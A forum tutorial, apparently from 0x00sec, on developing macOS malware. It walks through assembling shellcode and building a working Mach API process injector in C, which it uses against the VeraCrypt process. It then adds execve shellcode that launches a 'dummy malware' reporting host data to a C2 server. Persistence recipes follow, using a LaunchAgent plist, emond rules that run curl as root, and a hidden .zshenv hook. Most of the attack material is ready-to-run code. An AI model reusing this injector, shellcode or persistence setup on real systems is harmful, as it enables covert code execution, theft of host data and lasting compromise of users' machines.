A simple &quot;Hello World&quot; program starts by declaring two sections: `.data` and `.text`. The `.data` section is used for storing initialized data, while the `.text` section contains executable code. Then we define the `_main` function as the entry point of the program, followed by a reference point in the code, which we&#39;ll call `trick`. The `trick` section will be followed by a `call` instruction that invokes the `continue` subroutine and pops the address of the string &#39;Hello World!&#39;. Also, if you notice in the code, we have a system call at the end that exits our program. The first syscall is for writing data.

```c
section .data
section .text

global _main
	_main:

start:
	jmp trick

continue:
	pop rsi            ; Pop string address into rsi
	mov rax, 0x2000004 ; System call write = 4
	mov rdi, 1         ; Write to standard out = 1
	mov rdx, 14        ; The size to write
	syscall            ; Invoke the kernel
	mov rax, 0x2000001 ; System call number for exit = 1
	mov rdi, 0         ; Exit success = 0
	syscall            ; Invoke the kernel
	
trick:
	call continue
	db &quot;Hello World!&quot;, 0, 0
```

Alright, it&#39;s time to compile. I typically use NASM for assembling my code. Remember what I mentioned about using the linker to create Mach-O executables? Well, after assembling the code with NASM, we&#39;ll need to link it using `ld`. This linker not only brings together the assembled code but also incorporates necessary system libraries.

```sh
~ &gt; ./nasm -f macho64 Hello.asm -o hello.o &amp;&amp; ld ./Hello.o -o Hello -lSystem -syslibroot `xcrun -sdk macosx --show-sdk-path`

~ &gt; ./Hello
Hello World!
```

Pretty sophisticated, right? Now, to actually turn it into machine code that we can use for injection, it needs to be converted into a hexadecimal representation. This representation consists of a small series of bytes that represent executable machine-language code. It essentially represents the exact sequence of instructions that the processor will execute. For this, we can utilize `objdump`.

```sh
~ &gt; objdump -d ./Hello | grep &#39;[0-9a-f]:&#39;| grep -v &#39;file&#39;| cut -f2 -d:| cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;| sed &#39;s/ $//g&#39;| sed &#39;s/ /\\x/g&#39;| paste -d &#39;&#39; -s | sed &#39;s/^/&quot;/&#39;| sed &#39;s/$/&quot;/g&#39;

`\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a`
```

If, for some reason, you can&#39;t extract the `shellcode` solely relying on `objdump`, you can always script kiddy a simple py, to parse the assembly output; 

```python
def extract_shellcode(objdump_output):
    shellcode = &quot;&quot;
    length = 0
    lines = objdump_output.split(&#39;\n&#39;)
    
    for line in lines:
        if re.match(&quot;^[ ]*[0-9a-f]*:.*$&quot;, line):
            line = line.split(&quot;:&quot;)[1].lstrip()
            x = line.split(&quot;\t&quot;)
            opcode = re.findall(&quot;[0-9a-f][0-9a-f]&quot;, x[0])
            for i in opcode:
                shellcode += &quot;\\x&quot; + i
                length += 1

    return shellcode, length

def main():
    objdump_output = sys.stdin.read()
    shellcode, length = extract_shellcode(objdump_output)
    
    if shellcode == &quot;&quot;:
        print(&quot;Bad&quot;)
    else:
        print(&quot;\n&quot; + shellcode)

if __name__ == &quot;__main__&quot;:
    main()
```

But does the `shellcode` work? To ensure its functionality, we should test whether we can perform a simple injection. One way to do this is by compiling the `shellcode` and storing it as a global variable within the executable&#39;s `__TEXT,__text` section. We can achieve this by declaring the `shellcode` as a variable within the code itself. Here&#39;s a simple example:

```c
const char output[] __attribute__((section(&quot;__TEXT,__text&quot;))) =  &quot;
\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01
\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05
\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00
\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c
\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a&quot;;

typedef int (*funcPtr)();

int main(int argc, char **argv)
{
    funcPtr ret = (funcPtr) output;
    (*ret)();

    return 0;
}
```

Alright, now that we have the `shellcode`, let&#39;s start writing the actual injector. The `main` function seems like the natural starting point. The logic is simple: we take a single command-line argument, which should be the process ID (PID) of the target process to inject the shellcode into. Then, we obtain a handle to our task using `task_for_pid()`. Next, we&#39;ll allocate a memory buffer in the remote task with `mach_vm_allocate()`. After that, we&#39;ll write our shellcode to the remote buffer with `mach_vm_write()`. We&#39;ll modify the memory permissions of the remote buffer with `mach_vm_protect()`. Then, we&#39;ll update the remote thread context to point to the start of the shellcode with `thread_create_running()`. Finally, we&#39;ll run our shellcode, which will print &quot;Hello World&quot;.

Remember our earlier discussion about the differences between a Mach task thread and a BSD pthread, and the `task_for_pid()` API call. In order to develop a utility that utilizes `task_for_pid()`, you&#39;ll need to create an `Info.plist` file. This file will be embedded into your executable and will enable code signing with the key set to &quot;allow&quot;. Below is an example of the Info.plist:

```c
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
&lt;key&gt;com.apple.security.get-task-allow&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

Note:** not all sections of a program’s virtual memory permit their contents to be interpreted as code by the CPU (i.e., “marked executable”). Memory can be marked as readable (R), writable (W), executable (E), or some combination of the three. For instance, a page marked RW means one can read/write to these addresses in memory, but their contents may not be treated as executable by the CPU. This is a crucial aspect of memory protection and security in modern operating systems.

Executable memory regions are typically marked with the execute (E) permission, allowing the CPU to interpret the contents of these regions as machine instructions and execute them. This is essential for running programs, as the CPU needs to fetch instructions from memory and execute them.

However, allowing arbitrary memory regions to be executable can pose significant security risks, such as buffer overflow attacks or injection of malicious code. Therefore, modern operating systems employ memory protection mechanisms to restrict the execution of code to specific, authorized regions of memory.

By controlling the permissions of memory pages, operating systems can enforce security policies and prevent unauthorized execution of code. For example, writable memory regions that contain data should not be executable to prevent the execution of injected malicious code. Conversely, executable code should not be writable to prevent tampering with the program’s instructions.

Alright, the entry point we converts the PID provided as a string to an integer and calls the `inject_shellcode` function to inject the shellcode into the target process using the provided PID, 

We need to interact with the target process, so we declare a few variables to hold essential information. These include `remote_task` to represent the task port of the target process, `remote_stack` to store the address of the allocated memory for the remote stack within the target process, and `shellcode_region` to keep track of the memory region allocated for the shellcode.

Now, the process begins. We need to get permission to access the target process, so we use the `task_for_pid` function to obtain the task port. This allows us to manipulate the memory and threads of the target process.

With access granted, we proceed to allocate memory within the target process. We reserve space for both the remote stack and the shellcode using `mach_vm_allocate`. This ensures that we have a place to execute our code, Once memory is allocated, we write our shellcode into the allocated memory space of the target process using `mach_vm_write`. This effectively places our code where it needs to be executed.

```c
int inject_shellcode(pid_t pid, unsigned char *shellcode, size_t shellcode_size) {
    task_t remote_task;
    mach_vm_address_t remote_stack = 0;
    vm_region_t shellcode_region;
    mach_error_t kr;

    // Get the task port for the target process
    kr = task_for_pid(mach_task_self(), pid, &amp;remote_task);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to get the task port for the target process: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the stack in the target process
    kr = mach_vm_allocate(remote_task, &amp;remote_stack, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to allocate memory for remote stack: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    // Allocate memory for the shellcode in the target process
    kr = mach_vm_allocate(remote_task, &amp;shellcode_region.addr, shellcode_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to allocate memory for remote code: %s\n&quot;, mach_error_string(kr));
        return -1;
    }
    shellcode_region.size = shellcode_size;
    shellcode_region.prot = VM_PROT_READ | VM_PROT_EXECUTE;

    // Write the shellcode to the allocated memory in the target process
    kr = mach_vm_write(remote_task, shellcode_region.addr, (vm_offset_t)shellcode, shellcode_size);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to write shellcode to remote process: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    // Adjust memory permissions for the shellcode
    kr = vm_protect(remote_task, shellcode_region.addr, shellcode_region.size, FALSE, shellcode_region.prot);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to set memory permissions for remote code: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    // Create a remote thread to execute the shellcode
    x86_thread_state64_t thread_state;
    memset(&amp;thread_state, 0, sizeof(thread_state));
    thread_state.__rip = (uint64_t)shellcode_region.addr;
    thread_state.__rsp = (uint64_t)(remote_stack + STACK_SIZE);

    thread_act_t remote_thread;
    kr = thread_create(remote_task, &amp;remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to create remote thread: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    // Set the thread state
    kr = thread_set_state(remote_thread, x86_THREAD_STATE64, (thread_state_t)&amp;thread_state, x86_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to set thread state: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    // Resume the remote thread
    kr = thread_resume(remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, &quot;Failed to resume remote thread: %s\n&quot;, mach_error_string(kr));
        return -1;
    }

    printf(&quot;Shellcode injected successfully!\n&quot;);

    mach_port_deallocate(mach_task_self(), remote_thread);

    return 0;
}
```


To ensure that our shellcode can run, we modify the memory permissions of the allocated memory region containing the shellcode. We use `vm_protect` to set the appropriate permissions, allowing for execution. Now, it&#39;s time to execute our shellcode. We create a remote thread within the target process using `thread_create`. This thread will be responsible for running our injected code.

Before we start the thread, we need to set its state. We prepare the thread to execute our shellcode by setting the instruction pointer (`rip`) to the starting address of the shellcode and the stack pointer (`rsp`) to the allocated remote stack. Finally, we&#39;re ready to execute our shellcode. We resume the remote thread using `thread_resume`, allowing it to begin executing the injected code.

If everything goes smoothly, we print a success message indicating that the shellcode was injected successfully. We also clean up any resources used during the injection process by deallocating Mach ports. And that&#39;s it! The entire process of injecting shellcode into a target process on macOS using Mach APIs.

In our injector, we&#39;re injecting shellcode into a target process using Mach APIs in macOS. Now, one significant difference between POSIX threads and Mach threads comes into play here.
POSIX threads utilize the thread local storage (TLS) data structure, which is crucial for managing thread-specific data. However, Mach threads don&#39;t have this concept of TLS.

Now, when we inject our shellcode into the target process and create a remote thread to execute it, we can&#39;t simply point the instruction pointer in the thread context struct and expect everything to work smoothly. Why? Because our shellcode, which is essentially unmanaged code, needs to run in a controlled environment, and transitioning from a Mach thread directly to executing our shellcode might cause issues.

So, to prevent potential crashes or errors, we need to ensure that our shellcode is executed within the context of a fully-fledged POSIX thread. This means that as part of our injection process, we have to somehow promote our shellcode from being executed within the context of a base Mach thread to being executed within the context of a POSIX thread. By doing this, we create a more stable environment for our shellcode to execute, ensuring that when the target process resumes its execution at the start of our shellcode, it does so without any issues. This promotion process is essential for the successful execution of our injected shellcode in user mode without causing crashes or unexpected behavior.

As you can see, we injected our `shellcode` into the `Veracrypt` process successfully. The message &quot;Hello World!&quot; was printed, confirming that the shellcode executed as expected and produced the desired output.

&lt;img src=&quot;https://0xf00sec.github.io/images/IMG5.png&quot;&gt; 

However, let&#39;s shift our focus now. Remember the code we previously developed to transmit system data to the C2 server? What if we inject shellcode into the Veracrypt process to execute our dummy malware, enabling it to establish communication with the C2 server and transmit host data?

To execute a shell command, considering I&#39;m running zsh, we need to trigger a syscall to run `/bin/zsh -c`. For this, we need to utilize `execve`. What does this do? Simply put, it executes the program referenced by `_pathname`, which in our case will be the path to our dummy malware executable. 

Alright, let&#39;s proceed by writing a simple assembly code to execute `/bin/zsh -c &#39;/Users/foo/dummy&#39;`. First, we&#39;ll set up a register (`rbx`) and load the string `&#39;/bin/zsh&#39;` into it. Once this string is pushed onto the stack, we&#39;ll proceed to load the ASCII values for `-c` into the lower 16 bits of the `rax` register. After pushing this `-c` flag onto the stack, we&#39;ll set the `rbx` register to point to the `-c` flag on the stack, as it will be necessary later during the syscall preparation.

Any additional details will be described in comments within the code. At the end of this section, there&#39;s an indirect jump facilitating the execution of subsequent instructions. This jump redirects the program flow to the address stored in the `exec` subroutine, ensuring the continuity of execution.
```c
global _main

_main:
    xor rdx, rdx        ; Clear rdx register
    push rdx            ; Push NULL onto stack (String terminator)
    mov rbx, &#39;/bin/zsh&#39; ; Load &#39;/bin/zsh&#39; into rbx
    push rbx            ; Push &#39;/bin/zsh&#39; onto stack
    mov rdi, rsp        ; Set rdi to point to &#39;/bin/zsh\0&#39;
    xor rax, rax        ; Clear rax register
    mov ax, 0x632D      ; Load &quot;-c&quot; into lower 16 bits of rax
    push rax            ; Push &quot;-c&quot; onto stack
    mov rbx, rsp        ; Set rbx to point to &quot;-c&quot;
    push rdx            ; Push NULL onto stack
    jmp short dummy     ; Jump to label dummy

exec:
    push rbx            ; Push &quot;-c&quot; onto stack
    push rdi            ; Push &#39;/bin/zsh&#39; onto stack
    mov rsi, rsp        ; Set RSI to point to stack
    push 59             ; Push syscall number
    pop rax             ; Pop syscall number into rax
    bts rax, 25         ; Set 25th bit of rax (AT_FDCWD flag)
    syscall             ; Invoke syscall

dummy:
    call exec                   ; Call subroutine exec
    db &#39;/Users/foo/dummy_m&#39;, 0  ; Define string
    push rdx                    ; Push NULL onto stack
```
Alright, it&#39;s time to try this beauty. As usual, we&#39;ll need to extract the shellcode and test it before using it. And just like that, bingo! We&#39;ve successfully injected our shellcode, triggering our dummy malware. We&#39;re now receiving host information in the C2 server. We can push this further by exploring additional capabilities and attack vectors, even achieve persistence, but I think that&#39;s enough for now. 

&lt;img src=&quot;https://0xf00sec.github.io/images/IMG6.png&quot;&gt; 

Executing and sending host information essentially does nothing harmful to your computer. &quot;Dummy&quot; is more about demonstrating how malware can be triggered and how it uses injection techniques to spread. It&#39;s also interesting for defensive evasion or adding backdoor capabilities. This was just a quick look at the Mach API, covering system calls and code injection techniques, and how an attacker can utilize something like process injection to achieve malicious behavior. In this example, we&#39;ve used a legitimate process to inject and execute &quot;malicious code,&quot; potentially exposing host data to an attacker. This can be pushed further, but we&#39;re here just to learn, and I encourage you to experiment with caution. Code injection must be used with care.

I hope you&#39;ve learned something from this simple introduction, and there&#39;s a lot more to explore beyond what we&#39;ve touched on here. All the code used here can be found at [Github](https://github.com/0xf00sec/OSX-Injection) 

# Persistence

Alright, let&#39;s discuss _persistence_. It&#39;s a crucial step once we&#39;ve gained initial access and understood the situation. Typically, we aim to establish some form of persistence. We don&#39;t want to rely solely on that initial access point because it could be terminated for various reasons. There might be issues with the user&#39;s computer, or the target could decide to shut everything down. So, it&#39;s important to have a method in place to maintain access to the target.

While there are several persistence techniques for MacOS systems, many of them require root privileges to perform, or exploit some sort of low-level vulnerability to escalate. To keep things simple, let&#39;s focus on Userland Persistence. First, I&#39;ll describe some well-known persistence techniques and some lesser-known ones, so you can understand how these techniques work and how malware can use them. Alright, let&#39;s go :

Before I began writing this article, I analyzed some samples targeting macOS and read some threat reports. One commonality among them is that launch agents and launch daemons are by far the most prevalent methods of persistence. Why, you might ask? Well, it&#39;s because of their simplicity and flexibility. You could liken them to the startup folder persistence equivalent on Windows. However, detecting such techniques is relatively easy. Remember when we mentioned LOLBins? Well, think of it as a similarly straightforward and common method, and the detection methods are also well-known.

## LaunchAgent &amp; LaunchDaemon

LaunchAgents and LaunchDaemons are key components of macOS, responsible for managing processes automatically. LaunchAgents are typically located in the `~/Library/LaunchAgents` directory for user-specific tasks, triggering actions when a user logs in. On the flip side, LaunchDaemons are situated in `/Library/LaunchDaemons`, initiating tasks upon system startup.

Although LaunchAgents primarily operate within user sessions, they can also be found in system directories like `/System/Library/LaunchAgents`. However, modifying these files would require disabling System Integrity Protection (SIP), which is not recommended due to potential security risks. In contrast, LaunchDaemons, operating at a system level, require administrator privileges for installation and typically reside in `/Library/LaunchDaemons`.

Both LaunchAgents and LaunchDaemons are configured using `.plist` files, specifying commands or referencing executable files for execution.

LaunchAgents are suitable for tasks requiring user interaction, while LaunchDaemons are better suited for background processes. Let&#39;s take a LaunchAgents example:

```
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.pre.foo.plist&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;/Users/foo/dummy&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
```

So, what does this all mean? Basically, when we want our binary to run every time a user logs onto the system, we just tell launchd to handle it. It&#39;s pretty straightforward, right? But here&#39;s where it gets interesting: there&#39;s something called `emond`, a command native to macOS located at `/sbin/emond`. This little tool is quite handy; it accepts events from various services, processes them through a simple rules engine, and takes action accordingly. These actions can involve running commands or performing other tasks.

Now, `emond` isn&#39;t just any ordinary command. It functions as a regular daemon and is kicked off by launchd every time the operating system starts up. Its configuration file, where we set when and how `emond` runs, hangs out with the other system daemons at `/System/Library/LaunchDaemons/com.apple.emond.plist`.

But how can we use this event monitoring daemon to establish persistence? Well, the mechanics of `emond` are pretty much like any other LaunchDaemon. It&#39;s launchd&#39;s job to fire up all the LaunchDaemons and LaunchAgents during the boot process. Since `emond` starts up during boot, if you&#39;re using the `_run command_` action, you need to be mindful of what command you&#39;re executing and when during the boot process it&#39;ll happen.

```c
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;array&gt;
    &lt;dict&gt;
        &lt;key&gt;name&lt;/key&gt;
        &lt;string&gt;foo&lt;/string&gt;
        &lt;key&gt;enabled&lt;/key&gt;
        &lt;true/&gt;
        &lt;key&gt;eventTypes&lt;/key&gt;
        &lt;array&gt;
            &lt;string&gt;startup&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;actions&lt;/key&gt;
        &lt;array&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;sleep&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;10&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
            &lt;dict&gt;
                &lt;key&gt;command&lt;/key&gt;
                &lt;string&gt;curl&lt;/string&gt;
                &lt;key&gt;user&lt;/key&gt;
                &lt;string&gt;root&lt;/string&gt;
                &lt;key&gt;arguments&lt;/key&gt;
                &lt;array&gt;
                    &lt;string&gt;dns.log&lt;/string&gt;
                &lt;/array&gt;
                &lt;key&gt;type&lt;/key&gt;
                &lt;string&gt;RunCommand&lt;/string&gt;
            &lt;/dict&gt;
        &lt;/array&gt;
    &lt;/dict&gt;
&lt;/array&gt;
&lt;/plist&gt;
```

So, in our **SampleRules.plist** file, we have a setup called &#39;foo&#39;. First off, it waits for 10 seconds after startup. This is done using a command called `sleep`. Next, we use `curl` to simply send a DNS query record to verify that it&#39;s actually working, and once the service has started, your event will immediately fire and trigger any actions. `emond` isn&#39;t a new way to monitor events on macOS, but it&#39;s considered innovative when used for offensive purposes.

## Bash Profiles &amp; Zsh Startup 

Let&#39;s talk about those bash profiles on Linux systems. They&#39;re essentially scripts containing commands that run whenever you open up a terminal, Instead of bash profiles, zsh has its own version called start files, which serve the same purpose. But here&#39;s the twist: zsh also comes with an extra file called the zsh environment file. This file is more powerful because it kicks in more often, ensuring persistence across different interactions with zsh.

The cool thing is that even if you just type in a command like `zsh -c`, this shell environment file still gets sourced. This means your persistence setup remains strong, no matter how you&#39;re using shell.


```sh
~ &gt; cat .zshenv
. &quot;/Users/foo/startup.sh&quot; &gt; /dev/null 2&gt;&amp;1&amp;
```

Now, every time you open a terminal and Z shell initializes, it will automatically execute the `startup.sh` script, ensuring that your desired commands or actions are performed consistently.


&lt;img src=&quot;https://0xf00sec.github.io/images/IMG7.png&quot;&gt; 

Now, to execute it in the background, we use `setopt NO_MONITOR`. This command disables job monitoring and then runs the `startup.sh` script in the background. As a result, the script runs every time you open a terminal with Z shell, but it runs silently in the background.

So, you get the gist of it, right? These are some of the known techniques I&#39;ve come across, especially in samples. There&#39;s more like Cron jobs, Dock shortcuts, and more. But to be honest, if I were to write specifically for macOS, I&#39;d go multi-stage and avoid any known techniques out there. Simply put, once a technique is made public, it&#39;s burned. So , I&#39;ll focus more on developing something that has a longer lifespan.

Nowadays, with all the public scripts and post-exploitation frameworks out there, attackers try to get the job done easily without wasting time or energy. Writing malware takes time and energy, so they aim for low-hanging fruit that&#39;s just acceptable for a malware author. Because once the malware is burned, it&#39;s burned. But if it&#39;s a long-term operation, it takes time and skill to put together, and you can&#39;t risk the malware getting burned by the first few infection. But for a red team exercise, for example, you&#39;d test low-hanging fruit and an easy way to get in before emulating advance threats.

Also, a skilled attacker can get past most security setups with just a simple MSFvenom shellcode. Yep, so at the end, it comes down to the simplest attacks. Usually, at this point in the article, I&#39;ve added a section for writing a simple malware, where we take all that we&#39;ve covered and put it into one malware(rootkit). However, considering some thought, adding more code might just make things drag on and get confusing. We can save that for another article where we can really dive into the whole process because rootkits are quite advanced pieces of code and require knowledge about the kernel and low-level system programming. Since we just covered the surface here, I don&#39;t think a rootkit would be a match for this article; it needs its own article.

But hey, since we&#39;ve already covered code injection pretty extensively, we&#39;ll get into the fancy stuff later.

# Conclusion

In conclusion, I hope that you&#39;ve enjoyed and learned something from this article. We&#39;ve covered a broad array of topics related to the macOS architecture and API, although we&#39;ve only scratched the surface. By delving into techniques and writing simple code using the Mach API, we&#39;ve gained a deeper understanding of the environment, its features, and its security. We&#39;ve covered fundamental concepts like code injection and simple persistence techniques, and we&#39;ve even seen macOS syscalls in action through examples. Until next time.

## References  

- [I/O Kit Fundamentals](https://developer.apple.com/library/archive/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/IOService/IOService.html#//apple_ref/doc/uid/TP30000697-TPXREF101)
- [macOS - Apple Developer](https://developer.apple.com/library/archive/navigation/#section=Platforms&amp;topic=macOS)
- [Code Injection on macOS](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [Simple Code Injection](https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/)
- [Writing 64-bit Assembly on Mac OS X](http://www.idryman.org/blog/2014/12/02/writing-64-bit-assembly-on-mac-os-x/)
- [Architecture of the Kernel - Darwin](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Architecture/Architecture.html#//apple_ref/doc/uid/TP30000905-CH1g-CACDAEDC)</description>
    
    <lastBuildDate>Sat, 09 Mar 2024 15:47:57 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/macos-malware-development/39443.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>macOS Malware Development</title>
        <dc:creator><![CDATA[0xf00I]]></dc:creator>
        <description><![CDATA[
            <p>Thanks, appreciate it</p>
          <p><a href="https://0x00sec.org/t/macos-malware-development/39443/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/macos-malware-development/39443/3</link>
        <pubDate>Sat, 09 Mar 2024 15:47:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-39443-3</guid>
        <source url="https://0x00sec.org/t/macos-malware-development/39443.rss">macOS Malware Development</source>
      </item>
      <item>
        <title>macOS Malware Development</title>
        <dc:creator><![CDATA[cicada]]></dc:creator>
        <description><![CDATA[
            <p>Fantastic resource. Thank you for taking the time to make this!</p>
          <p><a href="https://0x00sec.org/t/macos-malware-development/39443/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/macos-malware-development/39443/2</link>
        <pubDate>Sat, 09 Mar 2024 04:39:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-39443-2</guid>
        <source url="https://0x00sec.org/t/macos-malware-development/39443.rss">macOS Malware Development</source>
      </item>
      <item>
        <title>macOS Malware Development</title>
        <dc:creator><![CDATA[0xf00I]]></dc:creator>
        <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this article, we’ll delve into the world of designing and developing malware for macOS, which is essentially a Unix-based operating system. We’ll take a classic approach to exploring Apple’s internals. All you need is a basic understanding of exploitation, along with knowledge of C and Python programming, as well as some familiarity with low-level assembly language to grasp the details here. While the topics discussed may be advanced, I’ll do my best to present them smoothly.</p>
<p>Let’s start by understanding the macOS architecture and its security features. We’ll then delve into the internals, covering key elements like the Mach API and kernel, and we’ll walk through some basic system calls and examples that are easy to understand. Next, we’ll introduce a dummy malware. Later on, we’ll explore code injection techniques and how they’re utilized in malware. We’ll also touch on persistence methods. To conclude, we’ll demonstrate a basic implementation of shellcode injection and persistence. Throughout, we’ll provide a detailed, step-by-step breakdown of the code and techniques involved.</p>
<h2><a name="background-2" class="anchor" href="https://0x00sec.org#background-2"></a>Background</h2>
<p>a little background from the internet, The Mac OS X kernel (xnu) is an operating system kernel with a unique lineage, merging the research-oriented Mach microkernel with the more traditional and contemporary FreeBSD monolithic kernel. The Mach microkernel combines a potent abstraction—Mach message-based interprocess communication (IPC)—with several cooperating servers to constitute the core of an operating system. Responsible for managing separate tasks within their own address spaces and comprising multiple threads, the Mach microkernel also features default servers that offer services like virtual memory paging and system clock management.</p>
<p>However, the Mach microkernel alone lacks crucial functionalities such as user management, file systems, and networking. To address this, the Mac OS X kernel incorporates a graft of the FreeBSD kernel, specifically its top-half (system call handlers, file systems, networking, etc.), ported to run atop the Mach microkernel. To mitigate performance concerns related to excessive IPC messaging between kernel components, both kernels reside in the same privileged address space. Nevertheless, the Mach API accessible from kernel code remains consistent with the Mach API available to user processes.</p>
<h1><a name="osx-3" class="anchor" href="https://0x00sec.org#osx-3"></a>Osx</h1>
<p>Before delving into macOS development, it’s crucial to grasp the fundamentals of the operating system. In this discussion, we’ll primarily focus on understanding the security protections, particularly System Integrity Protection (SIP),</p>
<p>SIP serves as a vital security feature designed to safeguard critical system files, directories, and processes from unauthorized modification or tampering by applications. It imposes restrictions on write access to protected system locations, even for processes with root privileges, thus preventing unauthorized alterations. Moreover, SIP implements additional security measures for system extensions and kernel drivers. For instance, kernel extensions are required to be signed by Apple or by developers using a valid Developer ID. This stringent requirement ensures that only trusted extensions are permitted to load into the kernel, bolstering the overall security of the system.</p>
<p><img src="https://0xf00sec.github.io/images/IMG1.png" width="690" height="341"> </p>
<p>As we can see, SIP (System Integrity Protection) is turned on, indicating that the system is benefiting from its security features. The presence of the “restricted” flag on certain directories highlights SIP’s protection of those specific areas. It’s important to note that SIP’s shielding may not extend to subdirectories within a SIP-protected directory.</p>
<p>To overcome this limitation, <code>Firmlinks</code> come into play. These allow certain directories to be “firmlinked,” which are special symbolic links protected by SIP. This ensures their functionality even in SIP-protected locations, enhancing compatibility, Which operate seamlessly, allowing applications and scripts to treat them as regular symbolic links without any special handling. This enables the creation of symbolic links in directories like <code>/usr, /bin</code>, <code>/sbin</code>, and <code>/etc</code>, which were previously inaccessible due to SIP.</p>
<p>By making use of <code>firmlinks</code>, developers and users can address compatibility challenges while still enjoying the security advantages of SIP. It strikes a balance between system protection and accommodating the needs of applications and scripts that rely on symbolic links in macOS. The use of firmlinks allows for access and modification of certain directories, even in traditionally protected locations. For instance, a firmlink can grant write access to <code>/usr/local</code>, providing flexibility for installing and managing software and scripts in that directory.</p>
<h2><a name="entitlements-4" class="anchor" href="https://0x00sec.org#entitlements-4"></a>Entitlements</h2>
<p>Now, onto Entitlements, Entitlements are permissions granted to applications on macOS, dictating their level of access and capabilities within the system. They control the application’s ability to interact with various system resources, including the network, file system, hardware, and user privacy-related information. By granting specific entitlements, macOS ensures that applications have the necessary permissions to perform their intended tasks while maintaining system integrity and protecting user privacy.</p>
<p>Entitlements are typically stored in the application’s Info.plist file, which is located within the <strong>.app</strong> bundle. The <strong>Info.plist</strong> file contains metadata and configuration details about the application, and it includes key-value pairs representing the entitlements. Each entitlement is represented by a key, denoting the specific permission or access level, and a value that defines its corresponding setting.</p>
<ul>
<li>For example, an entitlement entry in the Info.plist file may appear as follows:</li>
</ul>
<pre><code class="lang-xml">&lt;key&gt;com.apple.security.network.client&lt;/key&gt;
&lt;true/&gt;
</code></pre>
<p>In this case, the entitlement with the key “com.apple.security.network.client” indicates that the application has permission to act as a network client, granting it access to network resources.</p>
<ul>
<li>We can obtain entitlements of an application by using the following command:</li>
</ul>
<pre><code class="lang-bash">codesign --display --entitlements - /path/to/foo.app
</code></pre>
<p>The specific entitlements and their corresponding keys and values can vary based on the application’s requirements and the resources it needs to access. By defining entitlements, macOS ensures that applications operate within predefined boundaries, promoting security, privacy, and controlled access to system resources.</p>
<h2><a name="infoplist-5" class="anchor" href="https://0x00sec.org#infoplist-5"></a>Info.plist</h2>
